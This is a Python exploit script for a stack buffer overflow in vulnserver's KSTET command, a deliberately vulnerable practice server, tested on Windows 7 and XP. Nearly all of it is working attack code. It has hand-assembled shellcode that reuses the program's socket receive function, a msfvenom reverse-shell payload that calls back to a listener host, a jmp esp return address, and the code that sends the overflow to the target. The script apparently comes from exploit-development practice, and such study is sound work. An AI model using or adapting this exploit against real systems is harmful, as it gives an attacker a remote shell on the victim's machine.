'''vulnserver KSTET buffer overflow shell
 using >> socket receive function reuse
Tested on : Windows 7 32 bit, windows XP 32 bit SP3

Author : Goutham Madhwaraj (barriersec.com)
'''


import os
import socket
from time import sleep
import sys

host= "192.168.0.101"
port= 9999



'''
##address for win32.recv -> 00401953
00B8FA0C   00000080    |Socket = 80
00B8FA10   003E4B48    |Buffer = 003E4B48
00B8FA14   00001000   |BufSize = 1000 (4096.)
00B8FA18   00000000    \Flags = 0
'''

exploit= (
"\x54\x59\x66\x81\xC1\xC8\x01"
#00B8F9E3   54               PUSH ESP
#00B8F9E4   59               POP ECX
#00B8F9E5   66:81C1 C801     ADD CX,1C8 > get the socket address stored!

"\x33\xD2\x52\x80\xc6\x02\x52\x54\x5A\x80\xc2\x38\x52\xFF\x31"
#00B8F9EA   33D2             XOR EDX,EDX
#00B8F9EC   52               PUSH EDX
#00B8F9ED   80C6 02          ADD DH,2
#00B8F9F0   52               PUSH EDX
#00B8F9F1   54               PUSH ESP
#00B8F9F2   5A               POP EDX
#00B8F9F3   80 c2 38         ADD DL,36
#00B8F9F7   52               PUSH EDX
#00B8F9F8   FF31             PUSH DWORD PTR DS:[ECX]

"\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"

#00B8F9EE    B8 112C2540      MOV EAX,40252C11
#00B8F9F3    C1E8 08          SHR EAX,8
#00B8F9F6    FFD0             CALL EAX

)

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c
shell = (
"\xba\x72\x6a\x0e\xfd\xd9\xea\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x12\x83\xc6\x04\x03\x24\x64\xec\x08\x34\x90\x72"
"\xf2\xc4\x61\x13\x7a\x21\x50\x13\x18\x22\xc3\xa3\x6a\x66\xe8"
"\x48\x3e\x92\x7b\x3c\x97\x95\xcc\x8b\xc1\x98\xcd\xa0\x32\xbb"
"\x4d\xbb\x66\x1b\x6f\x74\x7b\x5a\xa8\x69\x76\x0e\x61\xe5\x25"
"\xbe\x06\xb3\xf5\x35\x54\x55\x7e\xaa\x2d\x54\xaf\x7d\x25\x0f"
"\x6f\x7c\xea\x3b\x26\x66\xef\x06\xf0\x1d\xdb\xfd\x03\xf7\x15"
"\xfd\xa8\x36\x9a\x0c\xb0\x7f\x1d\xef\xc7\x89\x5d\x92\xdf\x4e"
"\x1f\x48\x55\x54\x87\x1b\xcd\xb0\x39\xcf\x88\x33\x35\xa4\xdf"
"\x1b\x5a\x3b\x33\x10\x66\xb0\xb2\xf6\xee\x82\x90\xd2\xab\x51"
"\xb8\x43\x16\x37\xc5\x93\xf9\xe8\x63\xd8\x14\xfc\x19\x83\x70"
"\x31\x10\x3b\x81\x5d\x23\x48\xb3\xc2\x9f\xc6\xff\x8b\x39\x11"
"\xff\xa1\xfe\x8d\xfe\x49\xff\x84\xc4\x1e\xaf\xbe\xed\x1e\x24"
"\x3e\x11\xcb\xeb\x6e\xbd\xa4\x4b\xde\x7d\x15\x24\x34\x72\x4a"
"\x54\x37\x58\xe3\xff\xc2\x0b\xcc\xa8\xcc\xa3\xa4\xaa\xcc\x22"
"\x69\x22\x2a\x2e\x81\x62\xe5\xc7\x38\x2f\x7d\x79\xc4\xe5\xf8"
"\xb9\x4e\x0a\xfd\x74\xa7\x67\xed\xe1\x47\x32\x4f\xa7\x58\xe8"
"\xe7\x2b\xca\x77\xf7\x22\xf7\x2f\xa0\x63\xc9\x39\x24\x9e\x70"
"\x90\x5a\x63\xe4\xdb\xde\xb8\xd5\xe2\xdf\x4d\x61\xc1\xcf\x8b"
"\x6a\x4d\xbb\x43\x3d\x1b\x15\x22\x97\xed\xcf\xfc\x44\xa4\x87"
"\x79\xa7\x77\xd1\x85\xe2\x01\x3d\x37\x5b\x54\x42\xf8\x0b\x50"
"\x3b\xe4\xab\x9f\x96\xac\xcc\x7d\x32\xd9\x64\xd8\xd7\x60\xe9"
"\xdb\x02\xa6\x14\x58\xa6\x57\xe3\x40\xc3\x52\xaf\xc6\x38\x2f"
"\xa0\xa2\x3e\x9c\xc1\xe6"
)
payload = "\x90" * 25 + shell + "\x90"*(512-len(shell)-25)

#jmp esp \xaf\x11\x50\x62
buffer2 = 'KSTET ' + "A" * 9+"\x90"*5+"\x83\xec\x40"+ exploit +"\x90"*21 + "\xaf\x11\x50\x62"

#short negative jump
buffer2 += "\xeb\xBC"
buffer2 += "C"*498
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
print "[+] sending out initial payload ..."
conn.send((buffer2))
print "[+] sending out final payload ..."
sleep(1)
conn.send((payload))
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()

